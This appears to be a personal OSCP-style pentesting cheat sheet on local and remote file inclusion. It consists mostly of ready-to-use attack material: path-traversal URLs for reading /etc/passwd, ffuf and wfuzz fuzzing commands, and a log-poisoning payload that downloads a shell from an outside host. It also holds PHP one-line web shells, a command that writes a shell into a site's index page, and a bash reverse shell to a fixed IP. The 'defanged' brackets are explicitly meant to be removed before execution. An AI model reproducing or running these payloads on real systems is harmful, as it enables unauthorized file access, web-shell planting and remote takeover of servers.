
> [!NOTE] Windows Defender Antivirus (AV) triggers on `.md` (Markdown) files, often flagging them as potential threats. As a result, the commands provided below have been defanged to avoid false positives. Kindly remove the brackets `p_h_p` or `c_m_d` before executing them.

<https://gabb4r.gitbook.io/oscp-notes/web-http/lfi-and-rfi/php-wrappers>
## Basic LFI

> [!NOTE]
> 
> Basic examples: (try with various levels of url encoding)
> https://172.31.3.1/forum.chatlogs/chatlogs.p_h_p?file=/../../../../../../etc/passwd
> https://172.31.3.1/forum.chatlogs/chatlogs.p_h_p?file=/../../../../../../etc/passwd%00
> https://172.31.3.1/forum.chatlogs/chatlogs.p_h_p?file=/....//....//....//....//....//etc/passwd
> 
> https://172.31.3.1/forum.chatlogs/chatlogs.p_h_p?file=../../../../../../etc/passwd
> https://172.31.3.1/forum.chatlogs/chatlogs.p_h_p?file=../../../../../../etc/passwd%00
> https://172.31.3.1/forum.chatlogs/chatlogs.p_h_p?file=....//....//....//....//....//etc/passwd
> https://172.31.3.1/forum.chatlogs/chatlogs.p_h_p?file=....//....//....//....//....//etc/passwd%00
> 
> File wrappers:
> http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file:///../../../../../../../../etc/passwd
> 
> LFI fuzzing:
> ffuf -c -u '<https://172.31.3.1/forum.chatlogs/chatlogs.p_h_p?file=FUZZ'> -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -ignore-body
> wfuzz -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -c --hw 183 -u '<http://10.10.122.51/lab5.p_h_p?file=FUZZ'>
> wfuzz -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -c --hw 183 -u '<http://10.10.122.51/lab5.p_h_p?file=FUZZ'>
> 
> LFI Fuzzing through authenticated request:
> ffuf -c -u '<http://192.168.1.136/sea.p_h_p?file=../../../../../../FUZZ'> -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -b 'PHPSESSID=russhgsf2b2asdt3rm4jr4o50l' -fl 21
> ## LFI to RCE example
> source: <https://www.exploit-db.com/papers/12886>
> 
> if you can reach environ, this will likely work 
> www.website.com/view.p_hp?page=/../../../../../proc/self/environ
> 
> user agent:
> <?system('wget <http://hack-bay.com/Shells/gny.txt> -O shell.p_h_p');?>
> 
> ==
> 
> also something cool you can do in /var/mail/ somewhere where its an LFI with SMTP its possible to get a reverse shell with comboing these two somehow. ippsec.rocks explained it once. keep in mind
> 
> random other lfi to rce:
> <https://www.techsec.me/2020/09/local-file-inclusion-to-rce.html> (/proc/self/fd)
> ## RFI to RCE
> <https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/>
> <https://notchxor.github.io/oscp-notes/2-web/LFI-RFI/>
> 
> This will give you a webshell:
> shell.p_h_p
> 
> <?=`$_GET[c_m_d]`?>
> or
> <?=`$_REQUEST[c_m_d]`?>
> or
> <?p_h_p system($_REQUEST['c_m_d']); ?>
> 
> http://example.com/x.p_h_p?0=echo '<?p_h_p sh_ell_ex_ec($_REQUEST["0"]);?>' > /var/www/htdocs/nutilabor/ind3x.p_h_p
> 
> http://10.10.10.151/blog/?lang=//10.10.14.23/Public/shell.p_h_p&cmd=dir
> 
>
> ===================
> 
> php payload examples: (test several, as certain functions might be blacklisted)
> <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#p_h_p>
> If the exec or system functions in php is blacklisted, this might be able to work:
> 
> rev.p_h_p
> 
> 

> [!NOTE]
> ```
> <?[p_h_p]
> > // Executes, returns the entire output as a string
> > echo [shell]_[exec]("bash -c 'exec bash -i &>/dev/tcp/192.168.119.220/443 <&1'");
> > ?>
> ```

Sometimes & works better than ?, interesting enough.
> [!NOTE]
> ```
> <?p_h_p echo //DEFANGED shell_exec($REQUEST["c_m_d"]); exit; ?>     
> ```

![[docs/Attachments/_Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/LFI_RFi/LFI_RFi/{{notename}}-202605011742.png]]
![[docs/Attachments/_Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/LFI_RFi/LFI_RFi/{{notename}}-202605011742-1.png]]
![[docs/Attachments/_Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/LFI_RFi/LFI_RFi/{{notename}}-202605011743.png]]
![[docs/Attachments/_Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/LFI_RFi/LFI_RFi/{{notename}}-202605011743-1.png]]